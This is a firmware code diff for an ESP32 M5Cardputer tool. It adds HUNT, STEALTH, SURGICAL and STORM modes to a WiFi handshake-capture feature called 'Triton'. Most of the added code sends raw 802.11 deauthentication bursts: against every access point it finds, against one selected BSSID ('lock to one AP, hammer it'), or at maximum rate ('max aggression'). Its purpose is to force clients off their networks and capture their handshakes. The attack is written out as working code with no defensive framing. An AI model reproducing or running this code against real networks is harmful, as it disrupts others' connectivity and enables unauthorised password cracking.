@@ -23,6 +23,7 @@
 #include "input.h"
 #include "radio.h"
 #include "c5_cmd.h"
+#include "wifi_types.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include <SD.h>
@@ -36,6 +37,35 @@ static volatile uint32_t s_born = 0;
 static volatile uint8_t  s_ch    = 1;
 static volatile bool     s_alive = false;
 static File              s_file;
+
+/* ---- modes ---- */
+enum triton_mode_t {
+    TM_HUNT,      /* default: deauth every 3s on every known AP, RL-weighted hops */
+    TM_STEALTH,   /* observe-only: no deauths, capture organic handshakes */
+    TM_SURGICAL,  /* sit on one selected target's channel, deauth only that BSSID */
+    TM_STORM,     /* uniform-random hops, deauth every 1s, max aggression */
+};
+static volatile triton_mode_t s_mode = TM_HUNT;
+static uint8_t s_target_bssid[6] = {0};
+static uint8_t s_target_ch       = 1;
+static const char *mode_name(triton_mode_t m) {
+    switch (m) {
+    case TM_HUNT:     return "HUNT";
+    case TM_STEALTH:  return "STEALTH";
+    case TM_SURGICAL: return "SURGICAL";
+    case TM_STORM:    return "STORM";
+    }
+    return "?";
+}
+static const char *mode_blurb(triton_mode_t m) {
+    switch (m) {
+    case TM_HUNT:     return "default. deauth + RL hopping";
+    case TM_STEALTH:  return "passive observe, no TX";
+    case TM_SURGICAL: return "lock to one AP, hammer it";
+    case TM_STORM:    return "max aggression, every 1s";
+    }
+    return "";
+}
 
 /* ---- adaptive learning (lightweight RL) ----
  * Per-channel value estimate. Each successful capture on channel c
@@ -293,27 +323,67 @@ static void hop_task(void *)
     uint32_t last_hunt = 0;
     uint32_t last_save = millis();
     while (s_alive) {
-        s_ch = triton_pick_channel();
+        /* Channel selection per mode. */
+        switch (s_mode) {
+        case TM_SURGICAL:
+            s_ch = s_target_ch ? s_target_ch : 1;
+            break;
+        case TM_STORM:
+            s_ch = 1 + (esp_random() % 13);  /* uniform random */
+            break;
+        case TM_HUNT:
+        case TM_STEALTH:
+        default:
+            s_ch = triton_pick_channel();
+            break;
+        }
         s_visits[s_ch]++;
         esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
 
-        /* Every 3s do a deauth burst against every known AP on current ch. */
-        if (millis() - last_hunt > 3000 && s_bs_n > 0) {
+        /* Deauth cadence per mode. STEALTH never transmits. */
+        uint32_t hunt_period = 0;
+        switch (s_mode) {
+        case TM_HUNT:     hunt_period = 3000; break;
+        case TM_STORM:    hunt_period = 1000; break;
+        case TM_SURGICAL: hunt_period = 1500; break;
+        case TM_STEALTH:  hunt_period = 0;    break;  /* no deauth */
+        }
+
+        if (hunt_period > 0 && millis() - last_hunt > hunt_period) {
             last_hunt = millis();
-            for (int i = 0; i < s_bs_n && s_alive; ++i) {
-                memcpy(deauth + 10, s_bs[i].bssid, 6);
-                memcpy(deauth + 16, s_bs[i].bssid, 6);
-                for (int k = 0; k < 2; ++k) {
+            if (s_mode == TM_SURGICAL) {
+                /* Deauth only the selected target. */
+                memcpy(deauth + 10, s_target_bssid, 6);
+                memcpy(deauth + 16, s_target_bssid, 6);
+                int bursts = 8;
+                for (int k = 0; k < bursts && s_alive; ++k) {
                     esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
                     delay(5);
                 }
+            } else if (s_bs_n > 0) {
+                int bursts = (s_mode == TM_STORM) ? 4 : 2;
+                for (int i = 0; i < s_bs_n && s_alive; ++i) {
+                    memcpy(deauth + 10, s_bs[i].bssid, 6);
+                    memcpy(deauth + 16, s_bs[i].bssid, 6);
+                    for (int k = 0; k < bursts; ++k) {
+                        esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
+                        delay(5);
+                    }
+                }
             }
         }
-        /* Dwell longer on high-value channels, shorter on cold ones. */
-        int dwell_ms = 300 + (int)(s_q[s_ch] * 700);
+
+        /* Dwell per mode. */
+        int dwell_ms;
+        switch (s_mode) {
+        case TM_SURGICAL: dwell_ms = 1500; break;
+        case TM_STORM:    dwell_ms = 200;  break;
+        case TM_STEALTH:  dwell_ms = 800 + (int)(s_q[s_ch] * 1500); break;
+        case TM_HUNT:
+        default:          dwell_ms = 300 + (int)(s_q[s_ch] * 700);  break;
+        }
         delay(dwell_ms);
 
-        /* Persist learned weights every 30s so a restart keeps the brain. */
         if (millis() - last_save > 30000) {
             last_save = millis();
             triton_learn_save();
@@ -443,10 +513,58 @@ static void draw_face(int cx, int cy, mood_t m, uint32_t tick)
     }
 }
 
+/* Mode picker — cursor over 4 cards, ENTER selects, ESC bails. */
+static bool pick_mode(void)
+{
+    auto &d = M5Cardputer.Display;
+    int sel = (int)s_mode;
+    triton_mode_t modes[4] = { TM_HUNT, TM_STEALTH, TM_SURGICAL, TM_STORM };
+    ui_draw_footer(";/. pick  ENTER=launch  `=back");
+    while (true) {
+        ui_clear_body();
+        d.setTextColor(COL_MAGENTA, COL_BG);
+        d.setCursor(4, BODY_Y + 2); d.print("TRITON MODE");
+        d.drawFastHLine(4, BODY_Y + 12, 100, COL_MAGENTA);
+        for (int i = 0; i < 4; ++i) {
+            int y = BODY_Y + 18 + i * 14;
+            bool s = (i == sel);
+            if (s) d.fillRect(0, y - 1, SCR_W, 14, 0x3007);
+            d.setTextColor(s ? COL_ACCENT : COL_FG, s ? 0x3007 : COL_BG);
+            d.setCursor(6, y);     d.printf("%-8s", mode_name(modes[i]));
+            d.setTextColor(s ? 0xFFFF : COL_DIM, s ? 0x3007 : COL_BG);
+            d.setCursor(80, y);    d.print(mode_blurb(modes[i]));
+        }
+        uint16_t k = input_poll();
+        if (k == PK_NONE) { delay(30); continue; }
+        if (k == PK_ESC) return false;
+        if (k == ';' || k == PK_UP)   { if (sel > 0) sel--; }
+        if (k == '.' || k == PK_DOWN) { if (sel < 3) sel++; }
+        if (k == PK_ENTER) { s_mode = modes[sel]; return true; }
+    }
+}
+
+/* If SURGICAL, ask user to pick a target AP from the last WiFi scan
+ * results (g_last_selected_ap) — falls back to a quick scan. */
+static bool pick_surgical_target(void)
+{
+    extern ap_t g_last_selected_ap;
+    extern bool g_last_selected_valid;
+    if (g_last_selected_valid) {
+        memcpy(s_target_bssid, g_last_selected_ap.bssid, 6);
+        s_target_ch = g_last_selected_ap.channel ? g_last_selected_ap.channel : 1;
+        return true;
+    }
+    ui_toast("scan + pick AP first", COL_WARN, 1500);
+    return false;
+}
+
 void feat_triton(void)
 {
     radio_switch(RADIO_WIFI);
     WiFi.mode(WIFI_STA);
+
+    if (!pick_mode()) return;
+    if (s_mode == TM_SURGICAL && !pick_surgical_target()) return;
 
     if (!sd_mount()) { ui_toast("SD needed", COL_BAD, 1500); return; }
     SD.mkdir("/poseidon");
@@ -526,7 +644,10 @@ void feat_triton(void)
             d.setTextColor(COL_ACCENT, COL_BG);
             d.setCursor(118, BODY_Y + 4);
             d.print("TRITON");
-            d.drawFastHLine(118, BODY_Y + 14, 60, COL_ACCENT);
+            d.setTextColor(COL_MAGENTA, COL_BG);
+            d.setCursor(176, BODY_Y + 4);
+            d.print(mode_name(s_mode));
+            d.drawFastHLine(118, BODY_Y + 14, 100, COL_ACCENT);
             d.setTextColor(COL_FG, COL_BG);
             d.setCursor(118, BODY_Y + 18); d.printf("ch:   %u", s_ch);
             d.setCursor(118, BODY_Y + 28); d.printf("APs:  %d", s_bs_n);
